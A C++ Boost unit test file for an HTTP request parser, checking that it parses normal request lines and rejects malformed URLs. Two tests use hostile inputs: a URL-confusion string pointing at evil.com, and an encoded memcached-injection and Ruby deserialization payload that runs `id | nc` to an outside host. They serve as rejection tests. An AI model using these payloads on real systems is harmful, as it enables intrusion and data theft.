// The MIT License (MIT)
//
// Copyright (c) 2017 Darrell Wright
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files( the "Software" ), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and / or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

#include <cstdint>
#include <cstdlib>
#include <iostream>

#define BOOST_TEST_MODULE http_request_decoding
#include <daw/boost_test.h>

#include "http_req_parser.h"

CONSTEXPR daw::http::http_request parse_request( daw::string_view str ) {
	auto result = daw::http::http_request{
	  daw::construct_from<daw::http::http_request, daw::http::request_method, daw::http::http_uri, daw::http::http_version>(
	    str, daw::parser::single_whitespace_splitter{} )};

	return result;
}

/*
BOOST_AUTO_TEST_CASE( daw_http_req_decoding_test_001 ) {
	CONSTEXPR auto req = parse_request( "GET / HTTP/1.1" );

	BOOST_REQUIRE_EQUAL( to_string( req.method ), "GET" );
	BOOST_REQUIRE( req.uri.path == "/" );
	BOOST_REQUIRE_EQUAL( req.version.ver_minor, 1 );
	BOOST_REQUIRE_EQUAL( req.version.ver_major, 1 );
}
*/

BOOST_AUTO_TEST_CASE( daw_http_req_decoding_test_002 ) {
	auto req = parse_request( "GET https://www.google.ca:443/ HTTP/1.1" );

	BOOST_REQUIRE_EQUAL( to_string( req.method ), "GET" );
	BOOST_REQUIRE_EQUAL( req.uri.scheme, "https" );
	BOOST_REQUIRE_EQUAL( req.uri.host, "www.google.ca" );
	BOOST_REQUIRE_EQUAL( req.uri.port, 443 );
	BOOST_REQUIRE_EQUAL( req.uri.path, "/" );
	BOOST_REQUIRE_EQUAL( req.uri.query, "" );
	BOOST_REQUIRE_EQUAL( req.uri.fragment, "" );
	BOOST_REQUIRE_EQUAL( req.version.ver_minor, 1 );
	BOOST_REQUIRE_EQUAL( req.version.ver_major, 1 );
}

BOOST_AUTO_TEST_CASE( daw_http_req_decoding_test_003 ) {
	BOOST_REQUIRE_THROW( parse_request( "GET https://127.0.0.1:11211:80 HTTP/1.1" ),
	                     daw::parser::numeric_overflow_exception );
	BOOST_REQUIRE_THROW( parse_request( "GET http://1.1.1.1 &@2.2.2.2# @3.3.3.3/ HTTP/1.1" ),
	                     daw::parser::invalid_input_exception );
	BOOST_REQUIRE_THROW( parse_request( "GET http://google.com#@evil.com HTTP/1.1" ),
	                     daw::parser::invalid_input_exception );
}

namespace daw_http_req_decoding_test_004_ns {

	daw::http::http_request test( ) {
		return parse_request( R"(GET http://0:8000/composer/send_email
?to=orange@chroot.org
&url=http://127.0.0.1:11211/%0D%0Aset%20githubproductionsearch/quer
ies/code_query%3A857be82362ba02525cef496458ffb09cf30f6256%3Av3%3Aco
unt%200%2060%20150%0D%0A%04%08o%3A%40ActiveSupport%3A%3ADeprecation
%3A%3ADeprecatedInstanceVariableProxy%07%3A%0E%40instanceo%3A%08ERB
%07%3A%09%40srcI%22%1E%60id%20%7C%20nc%20orange.tw%2012345%60%06%3A
%06ET%3A%0C%40linenoi%00%3A%0C%40method%3A%0Bresult%0D%0A%0D%0A HTTP/1.1)" );
	}

	BOOST_AUTO_TEST_CASE( daw_http_req_decoding_test_004 ) {
		BOOST_REQUIRE_THROW( test( ), daw::parser::invalid_input_exception );
	}
} // namespace daw_http_req_decoding_test_004_ns
